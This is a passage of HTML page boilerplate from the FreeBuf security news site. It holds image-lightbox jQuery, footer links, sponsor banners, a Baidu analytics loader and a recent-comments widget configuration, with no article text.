  $('#contenttxt img').wrap(function(){
    if(!$(this).parent().attr('href')){
      var imgurl = $(this).attr('data-original');
      if(imgurl.substr(-6)=='!small'){
        imgurl = imgurl.substring(0,imgurl.length-6);
      }
      return '<a href="' + imgurl + '" class="highslide-image" onclick="return hs.expand(this);" target="_blank"></a>';
    }
  })
</script>
<script src="http://www.freebuf.com/buf/themes/freebuf/js/comments-ajax.js" type="text/javascript"></script>
<script type="text/javascript" src="http://static.3001.net/js/focus/jquery.nivo.slider.pack.js"></script>
<!----------footer---------->
<div class="footer">
  <div class="container">
    <div class="footer-list ">
      <h3>FREEBUF</h3>
      <ul>
        <li><a href="http://www.freebuf.com/dis">免责声明</a></li>
        <li><a href="http://www.freebuf.com/news/others/864.html">关于我们</a></li>
        <li><a href="http://www.freebuf.com/jobs/40386.html">加入我们</a></li>
      </ul>
    </div>
    <div class="footer-list ">
      <h3>广告及服务</h3>
      <ul>
        <li><a target="_blank" href="mailto:root@freebuf.com">寻求报道</a></li>
        <li><a href="http://www.freebuf.com/advertise">广告合作</a></li>
        <li><a target="_blank" href="mailto:help@freebuf.com">联系我们</a></li>
        <li><a href="http://www.freebuf.com/friends">友情链接</a></li>
      </ul>
    </div>
    <div class="footer-list ">
      <h3>关注我们</h3>
      <ul>
        <li><div class="weixin-pannel weixin"><a class="qr" href="javascript:viod(0);"><span class="g-icon-qr1">官方微信</span><i></i></a></div></li>
        <li><a rel="nofollow" target="_blank" href="http://weibo.com/freebuf">新浪微博</a></li>
        <li><a rel="nofollow" target="_blank" href="http://t.qq.com/freebuf">腾讯微博</a></li>
        <li><a rel="nofollow" target="_blank" href="http://twitter.com/freebuf">Twitter</a></li>
      </ul>
    </div>
    <div class="footer-list ">
      <h3>赞助商</h3>
      <ul>
        <li style="padding:6px 0 10px;"><a rel="nofollow" target="_blank" href="http://www.aliyun.com/?freebuf"><img src="http://image.3001.net/images/ad/ali.png"></a></li>
        <li><a rel="nofollow" target="_blank" href="http://www.upyun.com/?freebuf"><img src="http://image.3001.net/images/ad/upyun.png"></a></li>
        <li style="padding:6px 0 10px;"><a rel="nofollow" target="_blank" href="https://www.trustasia.com/?freebuf"><img src="http://image.3001.net/images/ad/ad-yzcx.png"></a></li>
      </ul>
    </div>
    <div class="footer-list ">
      <ul>
      </ul>
    </div>
    <div class="footer-logo  pull-right"><img src="http://image.3001.net/images/index/freebufrobot_shendanjie.png" ></div>
  </div>
  <div class="copyright"><div class="container"><p>Copyright &copy; 2017 WWW.FREEBUF.COM All Rights Reserved <a rel="nofollow" target="_blank" href="http://www.miitbeian.gov.cn">沪ICP备13033796号</a></p><span><a rel="nofollow" target="_blank" href="http://click.aliyun.com/m/1336/?freebuf"><img src="http://image.3001.net/images/new/icon-aly.png"></a></span></div></div>
</div>
<div class="bottom_tools"><a id="scrollUp" href="javascript:;" title="飞回顶部"></a></div>
<!----------footer end----------> 
<script src="http://static.3001.net/js/new/backtop.js"></script>
<script type="text/javascript">
jQuery(function(){	
	jQuery('.tabPanes ul li').click(function(){
		jQuery(this).addClass('hit').siblings().removeClass('hit');
		jQuery('.panesl>div:eq('+jQuery(this).index()+')').show().siblings().hide();	
	})
	jQuery('.vulbox-nav').click(function(e) { 
        e.stopPropagation(); 
    });  
})
</script>
<script type="text/javascript">
var _bdhmProtocol = (("https:" == document.location.protocol) ? " https://" : " http://");
document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3Fcc53db168808048541c6735ce30421f5' type='text/javascript'%3E%3C/script%3E"));
</script>
<img alt='css.php' src="http://www.freebuf.com/buf/plugins/cc/css.php?k=3cb185a485c81b23211eb80b75a406fd&amp;o=i&amp;t=1391842832" width='1' height='1' /><script type="text/javascript">
jQuery(function() {
    jQuery(".simditor pre").each(function(i, block){
        hljs.highlightBlock(block);    
    });
    hljs.initHighlightingOnLoad();
});
</script>
<script>
/* <![CDATA[ */
var rcGlobal = {
	serverUrl		:'http://www.freebuf.com',
	infoTemp		:'%REVIEWER% on %POST%',
	loadingText		:'Loading',
	noCommentsText	:'No comments',
	newestText		:'&laquo; 最新',
	newerText		:'&laquo; 新一点',
	olderText		:'旧一点 &raquo;',
	showContent		:'1',
	external		:'1',
	avatarSize		:'32',
	avatarPosition	:'left',
	anonymous		:'Anonymous'
};
/* ]]> */
</script>
<script type='text/javascript' src='http://static.3001.net/js/recentcomments/wp-recentcomments-jquery.js?ver=2.2.3'></script>
</body>
</html>
